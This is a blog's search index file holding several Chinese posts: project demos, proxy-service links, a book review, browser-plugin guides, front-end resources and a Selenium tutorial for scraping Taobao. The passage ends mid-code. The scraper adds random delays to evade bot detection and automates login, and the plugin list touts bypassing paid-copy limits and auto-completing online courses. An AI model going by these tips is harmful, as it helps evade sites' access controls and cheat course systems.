<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>优购微信小程序</title>
      <link href="/archives/bdac97cc.html"/>
      <url>/archives/bdac97cc.html</url>
      
        <content type="html"><![CDATA[<h1 id="关于-Vuex、uniapp-的学习"><a href="#关于-Vuex、uniapp-的学习" class="headerlink" title="关于 Vuex、uniapp 的学习"></a>关于 Vuex、uniapp 的学习</h1><h3 id="在学习小程序开发中，使用-uni-app-做的一个微信小程序"><a href="#在学习小程序开发中，使用-uni-app-做的一个微信小程序" class="headerlink" title="在学习小程序开发中，使用 uni-app 做的一个微信小程序"></a>在学习小程序开发中，使用 uni-app 做的一个微信小程序</h3><blockquote><p>项目地址<a href="https://gitee.com/yang-ku/uni-shop2">https://gitee.com/yang-ku/uni-shop2</a></p></blockquote><h3 id="实现了以下功能"><a href="#实现了以下功能" class="headerlink" title="实现了以下功能"></a>实现了以下功能</h3><ul><li>tabbar</li><li>首页</li><li>分类</li><li>搜索</li><li>商品列表</li><li>商品详情</li><li>加入购物车</li><li>购物车</li><li>登录与支付</li></ul><h2 id="图形界面展示"><a href="#图形界面展示" class="headerlink" title="图形界面展示"></a>图形界面展示</h2><h2 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h2><img src="../../img/uni-demo-img1.png"><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><img src="../../img/uni-demo-img2.png">]]></content>
      
      
      <categories>
          
          <category> uniapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目练手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用vue的一个demo</title>
      <link href="/archives/undefined.html"/>
      <url>/archives/undefined.html</url>
      
        <content type="html"><![CDATA[<h1 id="关于-Vue-的学习"><a href="#关于-Vue-的学习" class="headerlink" title="关于 Vue 的学习"></a>关于 Vue 的学习</h1><h3 id="在-Vue-的学习过程中，所尝试做的一个-demo"><a href="#在-Vue-的学习过程中，所尝试做的一个-demo" class="headerlink" title="在 Vue 的学习过程中，所尝试做的一个 demo"></a>在 Vue 的学习过程中，所尝试做的一个 demo</h3><blockquote><p>项目地址<a href="https://github.com/zyaire724/vue-demo01">https://github.com/zyaire724/vue-demo01</a></p></blockquote><h3 id="实现了以下功能"><a href="#实现了以下功能" class="headerlink" title="实现了以下功能"></a>实现了以下功能</h3><ul><li>未登录无法访问</li><li>用户列表</li><li>用户详情页</li><li>订单管理</li><li>商品管理</li></ul><h2 id="图形界面展示"><a href="#图形界面展示" class="headerlink" title="图形界面展示"></a>图形界面展示</h2><img src="../../img/vue-demo-img1.png"><img src="../../img/vue-demo-img2.png">]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目练手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机场网站</title>
      <link href="/archives/94488449.html"/>
      <url>/archives/94488449.html</url>
      
        <content type="html"><![CDATA[<h1 id="几个机场的收集网站"><a href="#几个机场的收集网站" class="headerlink" title="几个机场的收集网站"></a>几个机场的收集网站</h1><p>通过 SSR&#x2F;V2ray&#x2F;Clash（kxsw），其实很简单，总的来说分为两大步助你科学上网：</p><blockquote><p>1.找到机场「提供的线路链接」 2.用各平台代理客户端，「导入链接」，最后开启即可<br>后期代理软件不用换，只需要更新线路就行！</p></blockquote><p>本篇主要是长期提供 <code>机场地址</code> (包括但不限于白嫖机场、公益机场、良心机场、付费机场梯子等)</p><p>首先需要说明：因为近几年来打击力度持续加大，愿意做公益机场的人越来越少了，几乎都没有办法白嫖了<code>（原来基本上可以用免费线路，然后每天签到获取流量来白嫖）</code>，所以目前基本上都至少需要少量付费才能相对稳定</p><blockquote><p>注意：机场都有跑路可能，尽量不要一次性购买太长时间，建议一个月 一个月 一个月这样买！</p></blockquote><h2 id="猫梦博客（机场更新以及推荐）"><a href="#猫梦博客（机场更新以及推荐）" class="headerlink" title="猫梦博客（机场更新以及推荐）"></a>猫梦博客（机场更新以及推荐）</h2><p><a href="https://maomeng.cf/2021/06/11/ji-chang-tui-jian-chang-qi-geng-xin/#!">点击这里跳转&gt;&gt;&gt;</a></p><h2 id="爱机场（机场评测网站）"><a href="#爱机场（机场评测网站）" class="headerlink" title="爱机场（机场评测网站）"></a>爱机场（机场评测网站）</h2><p><a href="https://aijichang.com/date/2022/09/">点击这里跳转&gt;&gt;&gt;</a></p><h2 id="免费机场收集"><a href="#免费机场收集" class="headerlink" title="免费机场收集"></a>免费机场收集</h2><p><a href="https://askahh.com/index.php/archives/101/">点击这里跳转&gt;&gt;&gt;</a></p><h2 id="便宜好用的机场收集"><a href="#便宜好用的机场收集" class="headerlink" title="便宜好用的机场收集"></a>便宜好用的机场收集</h2><p><a href="https://www.askahh.com/index.php/archives/26/">点击这里跳转&gt;&gt;&gt;</a></p><h2 id="目前正在使用的机场"><a href="#目前正在使用的机场" class="headerlink" title="目前正在使用的机场"></a>目前正在使用的机场</h2><p><a href="https://sakuracat.world/#/dashboard">SakuraCat&gt;&gt;&gt;</a><br><a href="https://dokidokiweb.com/">SakuraCat 导航站&gt;&gt;&gt;</a></p><h2 id="各类账号的小卖部"><a href="#各类账号的小卖部" class="headerlink" title="各类账号的小卖部"></a>各类账号的小卖部</h2><p><a href="https://oneok.store/">点击这里跳转&gt;&gt;&gt;</a></p><h2 id="测速网站"><a href="#测速网站" class="headerlink" title="测速网站"></a>测速网站</h2><p><a href="https://myplugin.speedtest.cn/#/">点击这里跳转&gt;&gt;&gt;</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网站收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读《活着》有感</title>
      <link href="/archives/173a6792.html"/>
      <url>/archives/173a6792.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>《活着》，主人公福贵用平静地近乎陌生人的语调，讲述了自己与身边人的命运。 下面是本人读完这篇佳作的读后感，希望对您有所帮助</p></blockquote><blockquote><p>人们纷纷在这个叫做活着的故事里一一死去。</p></blockquote><p>作为一个冷酷的作者，余华不动声色地让我们跟随他的冰冷笔调，目睹少爷福贵的荒诞、破产和艰难;继而又假惺惺地给我们一点点美好的希望，让有庆得到长跑第一名，让凤霞嫁了人怀了孩子，让某些时刻有了温情脉脉，有了简陋的欢乐。然而就在我们以为噩梦不再萦绕他们的时候，余华丝毫没有犹疑，他铁青着脸让自己的角色们迅速以各种方式死去，毫无征兆，近乎残忍。</p><p>只留下我们错愕当场。</p><p>有庆是第一个突然死去的。</p><p>“有庆不会在这条路上跑来了。”他的母亲说。大多数人应该在这个时候心痛不已。贫苦艰难的生活，福贵简单而粗暴的教育方式，都不曾让有庆对生活丧失希望。他热爱他的两只小羊，为了割草和上学每天来回奔命。所以当他在父亲眼前拿了长跑第一名的时候，我们都天真地以为悲剧该结束了，事情在慢慢好起来，于是有了一点淡淡的喜乐。<br>可是我们怎么知道他会猝然死去。就像今天我们知道的许多社会底层的人们一样，有庆的死冤枉而荒谬。由于血型不幸与临盆的县长夫人相同，他竟是因为抽血过多而夭亡的。<br>我看着那条弯曲着通向城里的小路，听不到我儿子赤脚跑来的声音，月光照在路上，像是撒满了盐。”</p><p>一切就像一个巨大的诅咒。女儿，妻子，女婿，外孙，最后福贵只剩下自己。和一头也叫做福贵的老牛。</p><p>因为远离那些动荡的年月，因为并未真正有过艰难和困顿，这个故事让年青的我们不禁有些战栗。薄薄的十二万字，笼罩着“欲哭无泪的压抑”。只是阖上书本之时，内心似乎多了一些超越世俗欲望和纷争的平静。现实生活的无情与残忍，远比我们想象的要宽广;而活着，纵使要担当诸多难以承纳的苦痛，但是依然要坚忍，顽强。这应当便是生命的力量罢。</p><p>余华这么说他写作的缘起——</p><p>“我听到了一首美国民歌《老黑奴》，歌中那位老黑奴经历了一生的苦难，家人都先他而去，而他依然友好地对待世界，没有一句抱怨的话。这首歌深深打动了我，我决定写下一篇这样的小说，就是这篇《活着》。”</p><p>“活着，在我们中国的语言里充满了力量，它的力量不是来自于叫喊，也不是来自于进攻，而是忍受，去忍受生命赋予我们的责任，去忍受现实给予我们的幸福和苦难、无聊和平庸。”</p><p>所以在那些悲伤的情节之间，福贵仍然在死亡的伴随下活着，述说苦难的时候，眼睛里流出了奇妙的神色，分不清是悲伤，还是欣慰。</p><p>正如你终于会明白，无论现时我们经历的是措手不及的幸福喜悦，抑或是无可告人的艰辛苦难，只要继续活着，它们中的大多数细节和感受都将被我们和时间一一遗忘，只留下苍白的结果。那个结果对现时的我们毫发无伤。告诉我，谁还在不堪着高考的煎熬，失恋的痛苦，或者某个伤疤最初的鲜血淋漓?</p><p>——我仿佛已经看到许多问号：这样，我们的生存还有什么意义?</p><p>嗯，就像那谁说的，企图探究活着的意义注定只能成为一个笑话。人只是一种存在，它与天地万物一样并无意义。</p><p>呵，我们也许只需要像福贵那样活着，像那头老牛那样活着。尽管有些苍凉的意味。是不是爱过了才会懂得心死了还要活着的坎坷。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何使用插件</title>
      <link href="/archives/7c4dc2dc.html"/>
      <url>/archives/7c4dc2dc.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>Tampermonkey</code> 是一款免费的浏览器扩展和最为流行的用户脚本管理器，它适用于 Chrome, Microsoft Edge, Safari, Opera Next, 和 Firefox。</p></blockquote><blockquote><p>虽然有些受支持的浏览器拥有原生的用户脚本支持，但 Tampermonkey 将在您的用户脚本管理方面提供更多的便利。 它提供了诸如便捷脚本安装、自动更新检查、标签中的脚本运行状况速览、内置的编辑器等众多功能， 同时 Tampermonkey 还有可能正常运行原本并不兼容的脚本。</p></blockquote><h2 id="安装谷歌浏览器"><a href="#安装谷歌浏览器" class="headerlink" title="安装谷歌浏览器"></a>安装谷歌浏览器</h2><p>如何安装谷歌浏览器，就不用我说了吧，自行解决~</p><h2 id="安装油猴（Tampermonkey）插件"><a href="#安装油猴（Tampermonkey）插件" class="headerlink" title="安装油猴（Tampermonkey）插件"></a>安装油猴（Tampermonkey）插件</h2><p>Tampermonkey 插件官网：<a href="https://www.tampermonkey.net/">点击进入&gt;&gt;</a></p><h2 id="方法一：在线安装"><a href="#方法一：在线安装" class="headerlink" title="方法一：在线安装"></a>方法一：在线安装</h2><p>大部分人应该不能直接使用谷歌插件市场，所以直接跳转到方法二吧！！！！<br><img src ="https://img-blog.csdnimg.cn/20210127181122513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEwMTkxNDE=,size_16,color_FFFFFF,t_70"><br><img src ="https://img-blog.csdnimg.cn/20210127165509952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEwMTkxNDE=,size_16,color_FFFFFF,t_70"></p><h2 id="方法二：离线安装"><a href="#方法二：离线安装" class="headerlink" title="方法二：离线安装"></a>方法二：离线安装</h2><h2 id="下载离线油猴插件"><a href="#下载离线油猴插件" class="headerlink" title="下载离线油猴插件"></a>下载离线油猴插件</h2><p>离线文件下载地址（Tampermonkey 4.11）：<a href="https://download.csdn.net/download/u011019141/50601862">点击进入&gt;&gt;</a><br><img scr ="https://img-blog.csdnimg.cn/51f19ed6224e4006b4fcbaac7ad6df4b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a6L5Y-R5YWD,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h3 id="打开谷歌浏览器扩展程序管理页"><a href="#打开谷歌浏览器扩展程序管理页" class="headerlink" title="打开谷歌浏览器扩展程序管理页"></a>打开谷歌浏览器扩展程序管理页</h3><img src ="https://img-blog.csdnimg.cn/20210127172017285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEwMTkxNDE=,size_16,color_FFFFFF,t_70"><img src ="https://img-blog.csdnimg.cn/20210127172226700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEwMTkxNDE=,size_16,color_FFFFFF,t_70"><h3 id="将下载好的油猴插件拖入谷歌浏览器扩展程序管理页"><a href="#将下载好的油猴插件拖入谷歌浏览器扩展程序管理页" class="headerlink" title="将下载好的油猴插件拖入谷歌浏览器扩展程序管理页"></a>将下载好的油猴插件拖入谷歌浏览器扩展程序管理页</h3><img src ="https://img-blog.csdnimg.cn/20210127172420276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEwMTkxNDE=,size_16,color_FFFFFF,t_70"><h2 id="添加油猴（Tampermonkey）插件脚本文件"><a href="#添加油猴（Tampermonkey）插件脚本文件" class="headerlink" title="添加油猴（Tampermonkey）插件脚本文件"></a>添加油猴（Tampermonkey）插件脚本文件</h2><h3 id="进入插件管理面板"><a href="#进入插件管理面板" class="headerlink" title="进入插件管理面板"></a>进入插件管理面板</h3><img src ="https://img-blog.csdnimg.cn/2021012717263684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEwMTkxNDE=,size_16,color_FFFFFF,t_70"><img src ="https://img-blog.csdnimg.cn/20210127211452598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEwMTkxNDE=,size_16,color_FFFFFF,t_70"><h2 id="添加油猴脚本文件"><a href="#添加油猴脚本文件" class="headerlink" title="添加油猴脚本文件"></a>添加油猴脚本文件</h2><h3 id="方法一：在线安装-1"><a href="#方法一：在线安装-1" class="headerlink" title="方法一：在线安装"></a>方法一：在线安装</h3><p>脚本（Greasy Fork）官网：<a href="https://greasyfork.org/zh-CN">点击进入&gt;&gt;</a></p><p>选择一个你想要的脚本文件，进入详情页，安装即可~<br><img src ="https://img-blog.csdnimg.cn/20210127211800419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEwMTkxNDE=,size_16,color_FFFFFF,t_70"><br><img src ="https://img-blog.csdnimg.cn/20210127212035496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEwMTkxNDE=,size_16,color_FFFFFF,t_70"></p><h3 id="方法二：导入离线脚本"><a href="#方法二：导入离线脚本" class="headerlink" title="方法二：导入离线脚本"></a>方法二：导入离线脚本</h3><ul><li>声明：这里的离线脚本均来自 Greasy Fork 网站，均与本博主无关系，若脚本有侵犯到三方平台利益的，请寻求该网站协助。<br>本博文旨在指导如何安装油猴脚本插件，不涉及脚本研发。</li></ul><p>离线脚本下载链接（2021-11-27 更新）：<a href="https://download.csdn.net/download/u011019141/50621319">点击进入&gt;&gt;</a><br><img rsc ="https://img-blog.csdnimg.cn/19eecf69041146a58e204a431b21bc99.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a6L5Y-R5YWD,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img rsc ="https://img-blog.csdnimg.cn/20210127172904648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEwMTkxNDE=,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> 插件教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十个好用的浏览器插件</title>
      <link href="/archives/723d604f.html"/>
      <url>/archives/723d604f.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="如何使用浏览器插件"><a href="#如何使用浏览器插件" class="headerlink" title="如何使用浏览器插件"></a>如何使用浏览器插件</h2><blockquote><p>用了这么多年的浏览器，才发现浏览器的扩展插件这么好用。在工作上，安装了浏览器的扩展插件，大大提升了工作效率。一些朋友可能还不是很了解浏览器插件，它有什么作用？我们应该怎么安装浏览器扩展插件呢？下面，本文针对这些问题进行解答，希望能够帮助大家了解并使用好这些插件，丰富扩展浏览器的功能。</p></blockquote><h2 id="什么是浏览器插件？"><a href="#什么是浏览器插件？" class="headerlink" title="什么是浏览器插件？"></a>什么是浏览器插件？</h2><blockquote><p>浏览器插件，程序的运行有其自己运行的进程、方式等，其插件只是对其进行起一个补充作用的程序，插件是一种遵循一定规范的应用程序接口编写出来的程序。简单来说，就是在浏览器基本功能以外，添加一些扩展程序，增加浏览器的功能，比如网页翻译、广告拦截、Flash 插件等。大家对 Flash 应该很熟悉吧，安装它之后，就可以观看网络上无数精彩的 MTV 动漫了。</p></blockquote><h2 id="浏览器插件的作用"><a href="#浏览器插件的作用" class="headerlink" title="浏览器插件的作用"></a>浏览器插件的作用</h2><blockquote><p>浏览器插件的作用就是扩展应用功能、丰富浏览体验，目前很多开发商开发的浏览器都有丰富的插件，应用功能很广泛，生活各个领域基本上都涵盖了。</p></blockquote><h2 id="如何安装浏览器插件？"><a href="#如何安装浏览器插件？" class="headerlink" title="如何安装浏览器插件？"></a>如何安装浏览器插件？</h2><h3 id="进入"><a href="#进入" class="headerlink" title="进入"></a>进入</h3><p><a href="https://chrome.google.com/webstore/category/extensions?hl=zh-CN">Chrome 浏览器网上应用店</a>。<br><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.down123.ren%2Fattachment%2Fsoft%2F2017%2F0921%2F101308_65680271.jpg&refer=http%3A%2F%2Fwww.down123.ren&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1668704544&t=b7c6f870f2070e655f1172b9cdbfeae6"></p><h2 id="十款好用的插件"><a href="#十款好用的插件" class="headerlink" title="十款好用的插件"></a>十款好用的插件</h2><ul><li>1、AdGuard 广告拦截器</li></ul><p>一款无与伦比的广告拦截扩展，用以对抗各式广告与弹窗。可以拦截 <code>Facebook</code>、<code>YouTube</code> 和其它所有网站的广告。而且这款插件<code>可以拦截国内视频网站</code>的广告，甚是方便。</p><ul><li>2、万能哔哩哔哩下载助手</li></ul><p>专业的 bilibili 视频下载神器，对哔哩哔哩网 b 站下载视频抓取，网页媒体嗅探视频下载工具。</p><ul><li>3、oneTab</li></ul><p>节省高达 95％的内存，并减轻标签页混乱现象</p><ul><li>4、Infinity 新标签页</li></ul><p>百万用户选择的新标签页，自由添加网站图标，云端高清壁纸，快速访问书签、天气、笔记、待办事项、扩展管理与历史记录。</p><ul><li>5、Video Downloader professional——自动识别下载资源</li></ul><p>我们在浏览网页的时候有时候需要把网页上的视频下载下来，而这常常需要借助第三放的下载软件，过程有时候十分复杂而且在电脑上装有些软件也很烦， Video Downloader professional 的功能就是帮我们省去这一过程，它会自动检测网页中的所有的视频文件，提供一键下载，简直不要太方便！</p><ul><li>6、整张网页截图</li></ul><p>整张网页截图这款插件，就是针对网页截图最专业的一款插件，它可以实现：一键网页截图、滚动长截图、自定义截图！</p><ul><li>7、easySearch</li></ul><p>想找学习资料，但是总是找不到，尤其现在很多专业搜索的网站，因为一些原因无法继续使用，让人很是无奈。<code>easySearch</code>这款插件则集成了很多资源，汇合了相当全面的搜索工具，而且支持 BT 种子和磁力查询。</p><ul><li>8、Tampermonkey 油猴</li></ul><p>一个油猴插件，可以抵得上几十款插件，尤其是那些各种各样的脚本，简直太神奇了，可以实现各种不同的功能。(秒刷网课这个功能也有，具体操作过程我就不说了。)</p><ul><li>9、Simple Allow Copy</li></ul><p>百度文库等付费复制功能就成摆设了。</p><ul><li>10、Video Speed Plus</li></ul><p>倍速播放，最多可开 16 倍速。</p>]]></content>
      
      
      <categories>
          
          <category> 插件教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端技术网站</title>
      <link href="/archives/3c5b1c52.html"/>
      <url>/archives/3c5b1c52.html</url>
      
        <content type="html"><![CDATA[<h2 id="Bootsrap"><a href="#Bootsrap" class="headerlink" title="Bootsrap"></a>Bootsrap</h2><blockquote><p>Bootstrap 是最受欢迎的 HTML、CSS 和 JS 框架，用于开发响应式布局、移动设备优先的 WEB 项目<br><a href="https://v3.bootcss.com/">点此进入&gt;&gt;&gt;</a></p></blockquote><h2 id="MDN"><a href="#MDN" class="headerlink" title="MDN"></a>MDN</h2><blockquote><p>自 2005 年以来记录 web 技术，包括 CSS、HTML 和 JavaScript<br><a href="https://developer.mozilla.org/zh-CN/">点此进入&gt;&gt;&gt;</a></p></blockquote><h2 id="jQuery-及插件库"><a href="#jQuery-及插件库" class="headerlink" title="jQuery 及插件库"></a>jQuery 及插件库</h2><ul><li>jQuery<a href="https://jquery.com/">点此进入&gt;&gt;&gt;</a></li><li>jQuery 插件库<a href="https://www.jq22.com/">点此进入&gt;&gt;&gt;</a></li><li>jQuery 之家<a href="http://www.htmleaf.com/">点此进入&gt;&gt;&gt;</a></li></ul><h2 id="Landing"><a href="#Landing" class="headerlink" title="Landing"></a>Landing</h2><blockquote><p>Ant Design Landing 平台拥有丰富的各类首页模板，下载模板代码包，即可快速使用，也可使用首页编辑器，快速搭建一个属于你的专属首页<br><a href="https://ant-design-landing.gitee.io/index-cn">点此进入&gt;&gt;&gt;</a></p></blockquote><h2 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h2><blockquote><p>43% 的网页在 WordPress 上构建。越来越多的博主、小型企业和《财富》500 强公司使用 WordPress，其数量超过了其他所有选项的总和。加入数百万用户的行列，以 WordPress.com 为家。<br><a href="https://wordpress.com/zh-cn/">点此进入&gt;&gt;&gt;</a></p></blockquote><h2 id="Vuepress"><a href="#Vuepress" class="headerlink" title="Vuepress"></a>Vuepress</h2><ul><li><strong>简洁至上</strong></li></ul><p>以 Markdown 为中心的项目结构，以最少的配置帮助你专注于写作。</p><ul><li><strong>Vue 驱动</strong></li></ul><p>享受 Vue + webpack 的开发体验，可以在 Markdown 中使用 Vue 组件，又可以使用 Vue 来开发自定义主题.</p><ul><li><strong>高性能</strong></li></ul><p>VuePress 会为每个页面预渲染生成静态的 HTML，同时，每个页面被加载的时候，将作为 SPA 运行。</p><blockquote><p><a href="https://v1.vuepress.vuejs.org/zh/">点此进入&gt;&gt;&gt;</a></p></blockquote><h2 id="vant-组件库"><a href="#vant-组件库" class="headerlink" title="vant 组件库"></a>vant 组件库</h2><blockquote><p>Vant 底层依赖了 @vant&#x2F;use 包，其中内置了一系列的组合式 API。对于使用了 Vant 的项目，可以复用这些 API 进行开发。<br>Vant 是一个轻量、可靠的移动端组件库，于 2017 年开源。<br>目前 Vant 官方提供了 Vue 2 版本、Vue 3 版本和微信小程序版本，并由社区团队维护 React 版本和支付宝小程序版本。<br><a href="https://vant-contrib.gitee.io/vant/#/zh-CN/vant-use-intro">点此进入&gt;&gt;&gt;</a></p></blockquote><h2 id="Osrc"><a href="#Osrc" class="headerlink" title="Osrc"></a>Osrc</h2><blockquote><p>一个项目开源网站<br><a href="https://www.artbreeder.com/beta/browse">点此进入&gt;&gt;&gt;</a></p></blockquote><h2 id="artbreeder-图片收集网站"><a href="#artbreeder-图片收集网站" class="headerlink" title="artbreeder 图片收集网站"></a>artbreeder 图片收集网站</h2><blockquote><p><a href="https://www.artbreeder.com/beta/browse">点此进入&gt;&gt;&gt;</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬取淘宝数据</title>
      <link href="/archives/161a9e70.html"/>
      <url>/archives/161a9e70.html</url>
      
        <content type="html"><![CDATA[<h1 id="python-爬取淘宝数据"><a href="#python-爬取淘宝数据" class="headerlink" title="python 爬取淘宝数据"></a>python 爬取淘宝数据</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>随着互联网时代的到来，人们更加倾向于互联网购物，某宝又是电商行业的巨头，在某宝平台中有很多商家数据，今天带大家使用 python+selenium 工具获取这些公开的商家数据</p></blockquote><blockquote><p>环境介绍：<br><code>python 3.6</code> &gt; <code>pycharm</code> &gt; <code>selenium</code> &gt; <code>csv</code> &gt; <code>time</code> &gt; <code>random</code></p></blockquote><h2 id="1-创建一个浏览器对象"><a href="#1-创建一个浏览器对象" class="headerlink" title="1. 创建一个浏览器对象"></a>1. 创建一个浏览器对象</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">driver = webdriver.Chrome()</span><br></pre></td></tr></table></figure><h2 id="2-执行自动化页面操作"><a href="#2-执行自动化页面操作" class="headerlink" title="2. 执行自动化页面操作"></a>2. 执行自动化页面操作</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">driver.get(<span class="string">&#x27;https://www.taobao.com/&#x27;</span>)</span><br><span class="line">driver.maximize_window()  <span class="comment"># 最大化浏览器</span></span><br><span class="line">driver.implicitly_wait(<span class="number">10</span>)  <span class="comment"># 设置浏览器的隐式等待, 智能化的等待</span></span><br></pre></td></tr></table></figure><p>到这一步，你就可以自己运行代码看看可不可以自动打开你的浏览器进入淘宝的首页</p><h2 id="3-根据关键字搜索商品-解决登录"><a href="#3-根据关键字搜索商品-解决登录" class="headerlink" title="3. 根据关键字搜索商品, 解决登录"></a>3. 根据关键字搜索商品, 解决登录</h2><img src="https://img-blog.csdnimg.cn/img_convert/39ee73dedf65b562a3c7206b37680cc0.png"><img src="https://img-blog.csdnimg.cn/img_convert/49e65162fef9628f1c7c03edebc52902.png"><p>复制它的 xpath，用 xpath 语法提取页面标签的元素</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">search_product</span>(<span class="params">keyword</span>):</span><br><span class="line">    <span class="comment"># 输入框的标签对象</span></span><br><span class="line">    driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;q&quot;]&#x27;</span>).send_keys(keyword)</span><br><span class="line"></span><br><span class="line">word = <span class="built_in">input</span>(<span class="string">&#x27;请输入你要搜索商品的关键字:&#x27;</span>)</span><br></pre></td></tr></table></figure><p>运行代码<br><img src="https://img-blog.csdnimg.cn/img_convert/f605ba269d0e88817c61bd3fab6b679e.png"></p><p>前面搞定了搜索框的，现在来写点击搜索按钮的,同样复制它的 xpath</p><img src="https://img-blog.csdnimg.cn/img_convert/f5d16cf40fc5a6e0b31404e5d8f382e1.png"><h2 id="为了避免被检测"><a href="#为了避免被检测" class="headerlink" title="为了避免被检测"></a>为了避免被检测</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time  <span class="comment"># 时间模块  内置模块</span></span><br><span class="line">time.sleep(random.randint(<span class="number">1</span>, <span class="number">3</span>))  <span class="comment"># 随机休眠1到3秒</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J_TSearchForm&quot;]/div[1]/button&#x27;</span>).click()</span><br></pre></td></tr></table></figure><h2 id="4-解决登录"><a href="#4-解决登录" class="headerlink" title="4. 解决登录"></a>4. 解决登录</h2><p>点击了搜索按钮以后，会弹出登录界面给你，那就继续解决登录</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;fm-login-id&quot;]&#x27;</span>).send_keys(TAO_USERNAME)</span><br><span class="line">time.sleep(random.randint(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;fm-login-password&quot;]&#x27;</span>).send_keys(TAO_PASSWORD)</span><br><span class="line">time.sleep(random.randint(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;login-form&quot;]/div[4]/button&#x27;</span>).click()</span><br></pre></td></tr></table></figure><h2 id="5-解析数据"><a href="#5-解析数据" class="headerlink" title="5. 解析数据"></a>5. 解析数据</h2><p>获取目标数据的 div 标签<br><img src="https://img-blog.csdnimg.cn/img_convert/c3358672f1fe1f573718717f6b21e670.png"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_data</span>():</span><br><span class="line">    <span class="comment"># 所有div标签</span></span><br><span class="line">    divs = driver.find_elements_by_xpath(<span 